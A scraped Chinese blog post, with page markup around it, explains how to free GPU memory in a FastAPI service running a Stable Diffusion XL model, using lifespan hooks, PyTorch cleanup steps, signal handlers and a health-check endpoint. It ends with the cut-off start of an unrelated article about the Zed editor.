                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5def41376f0e436db16d2e868d7ff77e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9tb2NvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936582&amp;x-signature=EYRWW%2FL7NILBEcVYZZ%2Baoc%2BcMuU%3D" alt="ScreenShot_2025-12-10_095136_976.jpg" loading="lazy"/></p>
<blockquote>
<p>聊聊 AI 后端那些事儿 · 第 1 篇 | 预估阅读：10 分钟</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">发现显存泄漏 - 「我有个朋友」系列</h2>
<p>我有个朋友叫小禾，前些天，小禾踩了不少前端的坑。这几天，小禾开始对付后端。</p>
<p>后端用的是 FastAPI，跑在一台有 24G 显存的 GPU 服务器上。本地开发一切正常，部署上去也没问题。</p>
<p>直到有一天，小禾在服务器上按了 Ctrl+C 停掉服务，准备更新代码。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 停止服务</span>
^C
INFO: Shutting down...

<span class="hljs-comment"># 重新启动</span>
$ python run.py
</code></pre>
<p>然后，服务就崩了：</p>
<pre><code class="hljs language-sql" lang="sql">torch.cuda.OutOfMemoryError: CUDA <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> memory.
Tried <span class="hljs-keyword">to</span> <span class="hljs-keyword">allocate</span> <span class="hljs-number">2.00</span> GiB (GPU <span class="hljs-number">0</span>; <span class="hljs-number">24.00</span> GiB total capacity;
<span class="hljs-number">22.10</span> GiB already allocated; <span class="hljs-number">1.43</span> GiB <span class="hljs-keyword">free</span>)
</code></pre>
<p>小禾懵了：我明明停掉服务了，为什么显存还被占着？</p>
<p>他打开 nvidia-smi 一看：</p>
<pre><code class="hljs language-bash" lang="bash">$ nvidia-smi
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|=============================================================================|
|    0   N/A  N/A     12345      C   python                          10240MiB |
+-----------------------------------------------------------------------------+
</code></pre>
<p>进程还在！</p>
<p>原来 Ctrl+C 虽然停了 uvicorn，但 Python 进程没有完全退出，模型还在显存里躺着。</p>
<p>小禾只好 <code>kill -9</code> 强制杀掉进程，然后重新启动。</p>
<p>"这也太蠢了吧，每次重启都要手动杀进程？"</p>
<hr/>
<h2 data-id="heading-1">FastAPI 的生命周期</h2>
<p>小禾查了查文档，发现 FastAPI 有一套生命周期管理机制。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[应用启动]
    B[startup 事件]
    C[加载 AI 模型&lt;br/&gt;初始化数据库连接&lt;br/&gt;预热缓存]
    D[处理请求...]
    E[shutdown 事件]
    F[释放 AI 模型&lt;br/&gt;关闭数据库连接&lt;br/&gt;清理临时文件]
    G[应用关闭]

    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    E --&gt; F
    F --&gt; G
</code></pre>
<p>原来 FastAPI 提供了 <code>startup</code> 和 <code>shutdown</code> 两个事件钩子，可以在应用启动和关闭时执行特定逻辑。</p>
<p>小禾之前只写了加载模型的代码，但从来没写过释放模型的代码。</p>
<p>难怪显存不释放——根本没人告诉程序要释放。</p>
<hr/>
<h2 data-id="heading-2">两种写法</h2>
<p>FastAPI 支持两种生命周期管理方式。</p>
<p><strong>写法一：装饰器方式（传统写法）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

app = FastAPI()

<span class="hljs-meta">@app.on_event(<span class="hljs-params"><span class="hljs-string">"startup"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">startup_event</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用启动"</span>)
    <span class="hljs-comment"># 加载模型</span>

<span class="hljs-meta">@app.on_event(<span class="hljs-params"><span class="hljs-string">"shutdown"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">shutdown_event</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用关闭"</span>)
    <span class="hljs-comment"># 释放模型</span>
</code></pre>
<p><strong>写法二：lifespan 上下文管理器（推荐，FastAPI 0.93+）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> asynccontextmanager
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

<span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    <span class="hljs-comment"># 启动时执行</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用启动"</span>)
    <span class="hljs-keyword">yield</span>
    <span class="hljs-comment"># 关闭时执行</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用关闭"</span>)

app = FastAPI(lifespan=lifespan)
</code></pre>
<p>小禾选了第二种写法，因为它更清晰——启动和关闭的逻辑写在一起，一眼就能看出配对关系。</p>
<hr/>
<h2 data-id="heading-3">完整的生命周期管理</h2>
<p>小禾开始重构代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># app/main.py</span>
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> asynccontextmanager
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
<span class="hljs-keyword">from</span> app.services.model_manager <span class="hljs-keyword">import</span> ModelManager
<span class="hljs-keyword">from</span> app.core.config <span class="hljs-keyword">import</span> settings
<span class="hljs-keyword">from</span> app.core.logger <span class="hljs-keyword">import</span> logger

<span class="hljs-comment"># 全局模型管理器</span>
model_manager = ModelManager()

<span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    <span class="hljs-string">"""应用生命周期管理"""</span>

    <span class="hljs-comment"># ===== 启动阶段 =====</span>
    logger.info(<span class="hljs-string">f"正在启动 <span class="hljs-subst">{settings.PROJECT_NAME}</span>"</span>)
    logger.info(<span class="hljs-string">f"运行环境: <span class="hljs-subst">{settings.ENVIRONMENT}</span>"</span>)
    logger.info(<span class="hljs-string">f"设备: <span class="hljs-subst">{settings.DEVICE}</span>"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 加载 AI 模型</span>
        model_manager.load_model()
        logger.info(<span class="hljs-string">f"模型 (<span class="hljs-subst">{settings.IMAGE_MODEL}</span>) 加载完成"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"启动失败: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-keyword">raise</span>  <span class="hljs-comment"># 启动失败要抛出异常，阻止服务启动</span>

    <span class="hljs-comment"># ===== 运行阶段 =====</span>
    <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># 服务运行中...</span>

    <span class="hljs-comment"># ===== 关闭阶段 =====</span>
    logger.info(<span class="hljs-string">"正在关闭服务..."</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 释放模型资源</span>
        model_manager.cleanup()
        logger.info(<span class="hljs-string">"模型资源已释放"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"清理时出错: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)

    logger.info(<span class="hljs-string">"服务已关闭"</span>)

app = FastAPI(
    title=settings.PROJECT_NAME,
    lifespan=lifespan
)
</code></pre>
<p>关键在于 <code>cleanup()</code> 方法，它负责释放 GPU 显存。</p>
<hr/>
<h2 data-id="heading-4">模型清理的正确姿势</h2>
<p>小禾最初写的清理方法是这样的：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">del</span> self.model
    self.model = <span class="hljs-literal">None</span>
</code></pre>
<p>结果发现：显存还是没释放。</p>
<p>原来 PyTorch 的显存管理比较特殊，单纯 <code>del</code> 是不够的。小禾查了资料，找到了正确的清理流程：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># app/services/model_manager.py</span>
<span class="hljs-keyword">import</span> gc
<span class="hljs-keyword">import</span> torch

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelManager</span>:
    <span class="hljs-string">"""模型管理器"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.pipe = <span class="hljs-literal">None</span>
        self.device = settings.DEVICE

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_model</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""加载模型到 GPU"""</span>
        <span class="hljs-keyword">if</span> self.pipe <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>  <span class="hljs-comment"># 已加载，不重复加载</span>

        logger.info(<span class="hljs-string">"正在加载模型..."</span>)
        self.pipe = StableDiffusionXLPipeline.from_pretrained(
            settings.MODEL_PATH,
            torch_dtype=torch.float16,
        ).to(self.device)
        logger.info(<span class="hljs-string">"模型加载完成"</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""释放模型资源"""</span>
        <span class="hljs-keyword">if</span> self.pipe <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>

        logger.info(<span class="hljs-string">"正在释放模型资源..."</span>)

        <span class="hljs-comment"># 第一步：把模型从 GPU 移到 CPU</span>
        self.pipe.to(<span class="hljs-string">"cpu"</span>)

        <span class="hljs-comment"># 第二步：删除引用</span>
        <span class="hljs-keyword">del</span> self.pipe
        self.pipe = <span class="hljs-literal">None</span>

        <span class="hljs-comment"># 第三步：强制垃圾回收</span>
        gc.collect()

        <span class="hljs-comment"># 第四步：清理 CUDA 缓存</span>
        <span class="hljs-keyword">if</span> torch.cuda.is_available():
            torch.cuda.empty_cache()
            torch.cuda.synchronize()  <span class="hljs-comment"># 等待 GPU 操作完成</span>

        logger.info(<span class="hljs-string">"模型资源已释放"</span>)
</code></pre>
<p>四步缺一不可：</p>
<ol>
<li><strong>移到 CPU</strong>：先把张量从 GPU 搬走</li>
<li><strong>删除引用</strong>：解除 Python 对象的引用</li>
<li><strong>垃圾回收</strong>：触发 Python 的 GC</li>
<li><strong>清理缓存</strong>：告诉 CUDA 释放已分配但未使用的显存</li>
</ol>
<p>小禾测试了一下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动前</span>
$ nvidia-smi
GPU Memory: 2GB / 24GB

<span class="hljs-comment"># 服务运行中</span>
$ nvidia-smi
GPU Memory: 12GB / 24GB

<span class="hljs-comment"># Ctrl+C 停止服务</span>
$ nvidia-smi
GPU Memory: 2GB / 24GB  <span class="hljs-comment"># 释放了！</span>
</code></pre>
<p>终于正常了。</p>
<hr/>
<h2 data-id="heading-5">但是，Ctrl+C 有时候不管用</h2>
<p>小禾高兴了没两天，问题又来了。</p>
<p>有时候用 Ctrl+C 停止服务，<code>shutdown</code> 事件根本没触发，显存还是被占着。</p>
<p>他研究了一下，发现问题出在信号处理上。</p>
<p>当你按 Ctrl+C 时，系统发送的是 <code>SIGINT</code> 信号。正常情况下，uvicorn 会捕获这个信号，优雅地关闭服务。</p>
<p>但如果程序在执行某些阻塞操作（比如 AI 推理），可能来不及处理信号就被强制终止了。</p>
<p>更糟糕的是 <code>kill -9</code>，它发送的是 <code>SIGKILL</code> 信号，根本不给程序任何清理的机会。</p>
<p>小禾的解决方案是：<strong>注册信号处理器</strong>。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> signal
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">def</span> <span class="hljs-title function_">signal_handler</span>(<span class="hljs-params">signum, frame</span>):
    <span class="hljs-string">"""处理终止信号"""</span>
    logger.info(<span class="hljs-string">f"收到信号 <span class="hljs-subst">{signum}</span>，准备清理..."</span>)

    <span class="hljs-keyword">try</span>:
        model_manager.cleanup()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"清理失败: <span class="hljs-subst">{e}</span>"</span>)

    sys.exit(<span class="hljs-number">0</span>)

<span class="hljs-comment"># 注册信号处理器</span>
signal.signal(signal.SIGINT, signal_handler)   <span class="hljs-comment"># Ctrl+C</span>
signal.signal(signal.SIGTERM, signal_handler)  <span class="hljs-comment"># kill 命令</span>
</code></pre>
<p>这样即使 FastAPI 的 <code>shutdown</code> 事件没触发，信号处理器也能兜底。</p>
<hr/>
<h2 data-id="heading-6">Uvicorn 的优雅关闭配置</h2>
<p>小禾还发现 uvicorn 有个配置项可以控制优雅关闭的超时时间：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># run.py</span>
<span class="hljs-keyword">import</span> uvicorn

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    uvicorn.run(
        <span class="hljs-string">"app.main:app"</span>,
        host=<span class="hljs-string">"0.0.0.0"</span>,
        port=<span class="hljs-number">8000</span>,
        reload=<span class="hljs-literal">False</span>,  <span class="hljs-comment"># 生产环境不要开 reload</span>
        workers=<span class="hljs-number">1</span>,     <span class="hljs-comment"># AI 应用一般单进程</span>
        timeout_graceful_shutdown=<span class="hljs-number">30</span>,  <span class="hljs-comment"># 给 30 秒清理时间</span>
    )
</code></pre>
<p><code>timeout_graceful_shutdown</code> 参数告诉 uvicorn：收到停止信号后，等待最多 30 秒让程序完成清理工作。如果 30 秒内没清理完，才强制终止。</p>
<hr/>
<h2 data-id="heading-7">调试技巧：监控显存使用</h2>
<p>为了方便调试，小禾写了个显存监控函数：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">log_gpu_memory</span>():
    <span class="hljs-string">"""打印当前 GPU 显存使用"""</span>
    <span class="hljs-keyword">if</span> torch.cuda.is_available():
        allocated = torch.cuda.memory_allocated() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>
        reserved = torch.cuda.memory_reserved() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>
        logger.info(<span class="hljs-string">f"GPU 显存: 已分配 <span class="hljs-subst">{allocated:<span class="hljs-number">.2</span>f}</span>GB, 已预留 <span class="hljs-subst">{reserved:<span class="hljs-number">.2</span>f}</span>GB"</span>)
</code></pre>
<p>在关键位置调用：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    log_gpu_memory()  <span class="hljs-comment"># 启动前</span>
    model_manager.load_model()
    log_gpu_memory()  <span class="hljs-comment"># 加载后</span>

    <span class="hljs-keyword">yield</span>

    log_gpu_memory()  <span class="hljs-comment"># 清理前</span>
    model_manager.cleanup()
    log_gpu_memory()  <span class="hljs-comment"># 清理后</span>
</code></pre>
<p>输出类似这样：</p>
<pre><code class="hljs language-erlang" lang="erlang">GPU 显存: 已分配 <span class="hljs-number">0.00</span>GB, 已预留 <span class="hljs-number">0.00</span>GB
正在加载模型...
模型加载完成
GPU 显存: 已分配 <span class="hljs-number">9.87</span>GB, 已预留 <span class="hljs-number">10.12</span>GB
...
正在释放模型资源...
模型资源已释放
GPU 显存: 已分配 <span class="hljs-number">0.00</span>GB, 已预留 <span class="hljs-number">0.00</span>GB
</code></pre>
<p>一目了然。</p>
<hr/>
<h2 data-id="heading-8">健康检查端点</h2>
<p>小禾还加了个健康检查端点，方便运维监控：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/health"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">health_check</span>():
    gpu_info = {}
    <span class="hljs-keyword">if</span> torch.cuda.is_available():
        gpu_info = {
            <span class="hljs-string">"allocated_gb"</span>: <span class="hljs-built_in">round</span>(torch.cuda.memory_allocated() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>, <span class="hljs-number">2</span>),
            <span class="hljs-string">"reserved_gb"</span>: <span class="hljs-built_in">round</span>(torch.cuda.memory_reserved() / <span class="hljs-number">1024</span>**<span class="hljs-number">3</span>, <span class="hljs-number">2</span>),
        }

    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"healthy"</span>,
        <span class="hljs-string">"gpu"</span>: gpu_info,
        <span class="hljs-string">"model_loaded"</span>: model_manager.pipe <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
    }
</code></pre>
<p>请求 <code>/health</code> 就能看到当前状态：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"healthy"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"gpu"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"allocated_gb"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9.87</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"reserved_gb"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10.12</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"model_loaded"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">生命周期清单</h2>
<p>经过这番折腾，小禾总结了一份清单：</p>





















<table><thead><tr><th>阶段</th><th>动作</th></tr></thead><tbody><tr><td>startup</td><td>加载模型、初始化连接、预热缓存</td></tr><tr><td>运行中</td><td>处理请求、监控资源</td></tr><tr><td>shutdown</td><td>释放模型、关闭连接、清理缓存</td></tr></tbody></table>
<p><strong>关键点</strong>：</p>
<ol>
<li>使用 <code>lifespan</code> 上下文管理器，启动和关闭逻辑配对</li>
<li><code>cleanup()</code> 要彻底：移到 CPU、删引用、gc、empty_cache</li>
<li>注册信号处理器应对异常关闭</li>
<li>设置 <code>timeout_graceful_shutdown</code> 给清理留时间</li>
<li>添加健康检查端点方便监控</li>
</ol>
<hr/>
<h2 data-id="heading-10">小禾的感悟</h2>
<pre><code class="hljs language-bash" lang="bash">显存不会说谎，
不释放就是不释放。

启动时加载，
关闭时释放，
听起来很简单，
做起来全是坑。

del 不等于释放，
Ctrl+C 不等于关闭，
<span class="hljs-built_in">kill</span> -9 更是不讲武德。

lifespan 是救星，
信号处理是兜底，
四步清理要牢记：
移到 CPU、删引用、gc、empty_cache。

GPU 很贵，
显存更贵，
别让它们白白浪费。
</code></pre>
<p>小禾看着 nvidia-smi 显示的 2GB 占用，心情舒畅。</p>
<p>终于可以放心地重启服务了。</p>
<hr/>
<p><strong>下一篇预告：接口报 500 了，日志里却啥都没有</strong></p>
<blockquote>
<p>找了三小时的 bug，原来是异常被吞了。</p>
</blockquote>
<p>敬请期待。</p>
<hr/>
<p><code>#FastAPI</code> <code>#Python</code> <code>#GPU</code> <code>#显存管理</code> <code>#生命周期</code> <code>#AI应用</code></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Zed 正式上线「彩虹括号」—— 括号地狱终结者来了！]]></title>    <link>https://juejin.cn/post/7581698074362150921</link>    <guid>https://juejin.cn/post/7581698074362150921</guid>    <pubDate>2025-12-10T00:42:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698074362150921" data-draft-id="7579892134816464931" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Zed 正式上线「彩虹括号」—— 括号地狱终结者来了！"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T00:42:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="golang学习记"/> <meta itemprop="url" content="https://juejin.cn/user/4371313964100990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Zed 正式上线「彩虹括号」—— 括号地狱终结者来了！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313964100990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    golang学习记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:42:55.000Z" title="Wed Dec 10 2025 00:42:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    24
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol 